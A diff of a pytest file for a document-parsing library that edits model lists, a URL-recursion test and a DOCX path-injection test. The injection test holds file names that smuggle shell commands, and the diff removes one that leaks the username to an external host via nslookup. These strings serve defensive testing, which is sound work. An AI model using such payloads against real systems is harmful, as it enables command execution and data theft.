@@ -15,20 +15,11 @@ output_dir = "tests/outputs"
 os.makedirs(output_dir, exist_ok=True)
 models = [
     # Google models
-    "gemini-2.0-pro-exp",
     "gemini-2.0-flash",
-    "gemini-1.5-flash",
-    "gemini-1.5-flash-8b",
-    "gemini-1.5-pro",
+    "gemini-2.0-pro",
     # OpenAI models
     "gpt-4o",
     "gpt-4o-mini",
-    # Meta-LLAMA models through HF Hub
-    "meta-llama/Llama-3.2-11B-Vision-Instruct",
-    # Meta-LLAMA models through Together AI
-    "meta-llama/Llama-3.2-11B-Vision-Instruct-Turbo",
-    "meta-llama/Llama-3.2-90B-Vision-Instruct-Turbo",
-    "meta-llama/Llama-Vision-Free",
 ]
 
 
@@ -107,12 +98,11 @@ async def test_url_detection_pdfplumber(sample):
     assert any(found)
 
 
-@pytest.mark.parametrize("model", models)
 @pytest.mark.asyncio
-async def test_url_detection_multi_page_auto_routing(model):
+async def test_url_detection_multi_page_auto_routing():
     sample = "examples/inputs/sample_test_doc.pdf"
     patterns = ["http", "https", "www"]
-    config = {"parser_type": "AUTO", "model": model, "verbose": True}
+    config = {"parser_type": "AUTO", "verbose": True}
     results = parse(sample, pages_per_split=1, **config)["segments"]
 
     assert len(results) == 6
@@ -147,10 +137,12 @@ async def test_url_detection_multi_page_auto_routing(model):
 @pytest.mark.asyncio
 @pytest.mark.parametrize("depth", [1, 2])
 async def test_recursive_url_parsing(depth):
-    results = parse("https://example.com/", depth=depth)["segments"]
+    results = parse("https://example.com/", depth=depth)
 
+    n_total_segments = len(results["segments"]) + len(results["recursive_docs"])
+    # Each depth level adds one more document to be parsed.
     # Not necessarily always the case. Just the case for "example.com".
-    assert len(results) == depth
+    assert n_total_segments == depth, str(results)
 
 
 @pytest.mark.asyncio
@@ -276,19 +268,7 @@ async def test_large_pdf_parsing(sample):
     assert results[0]["content"] is not None
 
 
-token_usage_models = [
-    # Google models
-    "gemini-2.0-flash-001",
-    # OpenAI models
-    "gpt-4o",
-    # Meta-LLAMA models through HF Hub
-    "meta-llama/Llama-3.2-11B-Vision-Instruct",
-    # Meta-LLAMA models through Together AI
-    "meta-llama/Llama-3.2-11B-Vision-Instruct-Turbo",
-]
-
-
-@pytest.mark.parametrize("model", token_usage_models)
+@pytest.mark.parametrize("model", models)
 @pytest.mark.asyncio
 async def test_token_usage_api(model):
     sample = "examples/inputs/test_1.pdf"
@@ -340,14 +320,7 @@ async def test_page_nums():
     assert "acp@dca.ca.gov" not in result["raw"]
 
 
-@pytest.mark.parametrize(
-    "model",
-    [
-        "gemini-2.0-flash",
-        "gpt-4o",
-        "meta-llama/Llama-3.2-11B-Vision-Instruct-Turbo",
-    ],
-)
+@pytest.mark.parametrize("model", models)
 @pytest.mark.asyncio
 async def test_token_cost(model):
     sample = "examples/inputs/test_1.pdf"
@@ -425,8 +398,6 @@ async def test_strikethrough_words():
         "test; mkdir -p path_injection_success.docx",
         "test|mkdir -p path_injection_success.docx",
         "test&&mkdir -p path_injection_success.docx",
-        "test`nslookup $(whoami).zgj16g1o2dmxv2y6wwmegjxaq1wskt8i.net-spi.com`.docx",
-        "ifconfig -a; echo 'test'.docx",
     ],
 )
 @pytest.mark.asyncio
@@ -435,7 +406,7 @@ async def test_docx_path_injection(sample):
     parser_type = "STATIC_PARSE"
     dir_name = "path_injection_success"
     try:
-        parse(sample, parser_type)["raw"]
+        parse(sample, parser_type, retry_on_fail=False)["raw"]
     except Exception as e:
         print(f"Parsing failed: {e}")
         assert "Package not found" in str(e)
